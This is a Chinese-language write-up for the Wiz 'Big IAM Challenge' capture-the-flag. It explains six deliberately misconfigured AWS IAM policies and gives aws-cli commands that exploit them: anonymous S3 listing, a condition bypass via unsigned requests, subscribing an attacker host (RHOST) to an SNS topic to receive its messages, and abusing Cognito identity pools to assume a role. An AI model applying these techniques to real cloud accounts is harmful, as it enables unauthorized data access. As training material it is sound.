---
title: WIZ IAM 挑战赛 Writeup by shadowabi
---

<center><h1>WIZ IAM 挑战赛 Writeup by shadowabi</h1><h2>本文作者：shadowabi</h2><br><br></center>

---

挑战赛地址：[bigiamchallenge.com](bigiamchallenge.com)

我的这篇 Writeup ，在打法上与 TeamsSix 师傅有所不同，但基本原理一致，所以不再赘述原理，对原理方面感兴趣，可以看 TeamsSix 师傅这篇 [WIZ IAM 挑战赛 Writeup](https://wiki.teamssix.com/cloudservice/iam/the_big_iam_challenge_writeup.html)。


## 前提工作

准备一个 aws 帐号，新建一个 IAM 用户并赋予 `AdministratorAccess` 策略，创建访问密钥。

或者使用主账号创建访问密钥。

然后在 `aws configure` 中配置该密钥凭据。

## 1. Buckets of Fun

题目 policy：

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                }
            }
        }
    ]
}
```

大致意思是，允许所以人直接访问具体的 object 和列出 files 目录的 objects。

由于前面的前提工作，我们已经配置好了 aws cli，可直接用 aws s3 来访问。

或者是，aws cli 匿名访问该存储桶。

这里展示匿名访问方法：

列举存储桶

```bash
aws s3 ls s3://thebigiamchallenge-storage-9979f4b/files/  --no-sign-request
```

下载object到本地查看

```bash
aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/xxx.txt --no-sign-request 1.txt
```

```bash
cat 1.txt
```


### 小知识

`--no-sign-request` 是 aws 的一个全局参数，当此参数使用时，aws 不会使用 `aws configure` 中的配置，具体可见 `aws help`。

```bash
 --no-sign-request (boolean)

   Do not sign requests. Credentials will not be loaded if this argument is provided.
```

## 2. ~~Google~~ Analytics

题目 policy：

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```

大致意思是，允许所有人对 wiz-tbic-analytics-sqs-queue-ca7a1b2 消息队列接收信息和发送信息。

由于我们需要获取 flag，所以应该是去获取这个消息队列的信息。

通过查阅帮助文档，发现接收信息需要一个 queueurl 参数，即队列的地址。

此时通过 f12 审计该网页，可以发现 queueurl。

<div align=center><img width="1000" src="/img/2000000018.png"></div></br>

https://sqs.us-east-1.amazonaws.com 实际上是 sqs 在 aws-cli 的传统 endpoint，这个在官方文档里有，us-east-1 是 region。

```bash
sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
```

接收到信息后，在 body 会有一个地址，访问可得到 flag。


### 小知识

并不是所有地方都能利用 `--no-sign-request` 进行匿名访问，比如此处，如果使用了匿名访问，则会提示拒绝访问。

因此，配置一个真实的 aws 凭据还是很有必要的。


## 3. Enable Push Notifications

题目 policy：

```json
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```

大致意思是，允许所有人订阅 TBICWizPushNotifications 主题，但是限制 endpoint 必须包含 `@tbic.wiz.io`。

这里直接用 aws cli 订阅该主题，并将自己服务器作为 endpoint 即可接收到订阅。

利用 nc 起一个监听端口用于监听订阅信息。

然后 aws cli 发送订阅主题的请求：

```bash
aws sns subscribe --protocol http --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --notification-endpoint http://RHOST:RPORT/@tbic.wiz.io
```

正确接收到信息时，会返回订阅主题的凭证，提取其中的 token 即可。

这时候，aws 会返回一个 pending confirmation 的信息，并且在大概 5 秒后关闭连接。

然后，由于此时连接已关闭，需要重新监听。

aws cli 确认订阅：

```bash
aws sns confirm-subscription --token xxx --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications
```

当确认订阅成功时，会向之前的 notification-endpoint 推送该主题的信息，在 Message 中可以看到 flag。

### 小知识

当使用 `aws subscribe help` 时，官方给出的描述是：

>将端点订阅到 Amazon SNS 主题。如果端点类型是 HTTP/S 或电子邮件，或者端点和主题不在同一个 Amazon Web Services 帐户中，则端点所有者必须运行 confirm-subscription 操作来确认订阅。

>使用来自订阅响应的令牌调用 ConfirmSubscription 操作。确认令牌的有效期为三天。

>此操作被限制为每秒 100 个事务(TPS)。


因此我们需要利用 `confirm-subscription` 来确认订阅主题。

## 4. Admin only?

题目 policy：

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```

大致意思是，匹配 PrincipalArn 的字符串是否为 `arn:aws:iam::133713371337:user/admin`，其他条件同第一题。

这里可以利用匿名访问来绕过这个限制，解法和第一题一致。

```bash
aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request
```

```bash
aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/xxx.txt --no-sign-request 1.txt
```

```bash
cat 1.txt
```

### 小知识

aws s3 使用的是 apiv2 ，但并不是所有的环境都支持 apiv2，如果想要调用 apiv1 可以利用 aws s3api来实现：

```bash
aws s3api list-objects --bucket thebigiamchallenge-admin-storage-abf1321 --prefix "files/"  --no-sign-request

aws s3api get-object --bucket thebigiamchallenge-admin-storage-abf1321 --key "files/xxx.txt"  --no-sign-request 1.txt
```

匿名访问能绕过 ForAllValues 限制的原因：

[https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-single-vs-multi-valued-context-keys.html](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-single-vs-multi-valued-context-keys.html#reference_policies_condition-multi-valued-context-keys)

> 要将条件上下文键与具有多个值的请求上下文键进行比较，必须使用 ForAllValues 或 ForAnyValue set 运算符。这些集合运算符用于比较两组值，例如请求中的标记集合和策略条件中的标记集合。

> ForAllValues 和 ForAnyValue 限定符为条件运算符添加了设置操作功能，以便您可以针对策略条件中的多个上下文键值测试具有多个值的请求上下文键。

> 此外，如果您在策略中使用通配符或变量包含多值字符串上下文键，则还必须使用 StringLike 条件运算符。多个条件键值必须像数组一样括在方括号中。例如， "Key2":["Value2A", "Value2B"] 。

> ForAllValues -此限定符测试请求集的每个成员的值是否是条件上下文键集的子集。

> 如果请求中的每个上下文键值都与策略中的至少一个上下文键值匹配，则条件返回true。

> 如果请求中没有上下文键，或者上下文键值解析为空数据集（如空字符串），它也会返回true。

> 要防止缺少上下文键或上下文键值为空时计算为true，您可以在策略中包含Null条件运算符，并使用false值来检查上下文键是否存在且其值是否为null。

> 重要
> 如果使用具有 Allow 效果的 ForAllValues ，请谨慎使用，因为如果请求上下文中意外存在缺少的上下文键或具有空值的上下文键，则可能过于宽松。您可以在策略中使用false值包含 Null 条件运算符，以检查上下文键是否存在且其值是否不为null。有关示例，请参见基于标记键控制访问。

> ForAnyValue -此限定符测试请求上下文键值集合中的至少一个成员是否与策略条件中的上下文键值集合中的至少一个成员匹配。

> 如果请求中的任何一个上下文键值与策略中的任何一个上下文键值匹配，则上下文键值返回true。如果没有匹配的上下文键或数据集为空，则条件返回false。

重点在这句：如果请求中没有上下文键，或者上下文键值解析为空数据集（如空字符串），它也会返回true。

## 5. Do I know you?

题目 policy：

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "mobileanalytics:PutEvents",
                "cognito-sync:*"
            ],
            "Resource": "*"
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::wiz-privatefiles",
                "arn:aws:s3:::wiz-privatefiles/*"
            ]
        }
    ]
}
```

大致意思是，该策略下的用户，可以操作 s3 和 cognito。

那么，首先我们必需要获得这个策略。根据题目提示，这个策略是通过 AWS Cognito 来配置身份的。所以我们需要从目标的身份池中获取一个合法身份。

此时，我们再次查看网站源码，发现存在身份池：

<div align=center><img width="1000" src="/img/2000000019.png"></div></br>

接下来，我们利用 aws-cli 来获取身份池的身份：

```bash
aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
```

获得身份id之后，再获取此身份id的临时凭证：

```bash
aws cognito-identity get-credentials-for-identity --identity-id us-east-1:5a7b65c9-6292-4f98-999a-bb7c5779599c
```

然后，配置该身份凭证：

```bash
aws configure set aws_access_key_id xxx
aws configure set aws_secret_access_key xxx
aws configure set aws_session_token xxx
```

配置好身份以后，和之前的解题方法一样，ls 存储桶，然后 cp flag 到本地查看即可。

### 小知识

aws cognito 有身份池和用户池，身份池允许用户使用多个身份提供者进行身份验证，并为其提供唯一的身份标识和临时凭证。用户池则提供了用户账号的创建、管理和身份验证功能。

## 6. One final push

题目 policy

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}
```

大致意思是，通过 cognito 认证的 `us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b` 身份池身份，才可以使用 `sts:AssumeRoleWithWebIdentity` 功能扮演此角色以获得对应权限。

通过查看，发现 `sts assume-role-with-web-identity` 功能需要 `--web-identity-token` 参数，此参数可以通过身份池身份生成一个 OpenID Connect (OIDC) 令牌作为校验值。

`sts assume-role-with-web-identity` 的其他必选参数，role-arn 填入网站提示的 `arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role`，`--role-session-name` 随意填即可。

role-session-name 是定义这个扮演的角色名称。

整体流程如下：

通过身份池获取一个身份，并利用此身份生成OICD令牌

```bash
aws cognito-identity get-id --identity-pool-id us-east-1:385137ad-eb91-477c-a66c-3e76cf7e82c7
aws cognito-identity get-open-id-token --identity-id us-east-1:385137ad-eb91-477c-a66c-3e76cf7e82c7
```

扮演角色：

```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --web-identity-token xxx --role-session-name hacker
```

扮演角色之后，利用第五题用到的配置临时身份凭证方法，配置好之后，去找s3 wiz-privatefiles-x1000 桶下的 flag 即可。

### 小知识

OIDC 令牌是一种具有结构化数据的令牌，包含有关用户身份和授权范围的信息。它通常由身份提供者生成，并作为身份验证的结果返回给应用程序。

OIDC 令牌是一种特定类型的 Web 身份验证令牌，用于进行身份验证和授权管理。

## 结尾

当你通过了所有挑战后，你会获得一张类似这样的通关证明：

<div align=center><img width="700" src="/img/2000000020.png"></div></br>

<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2023 年 10 月 16 日"
    }
  }
</script>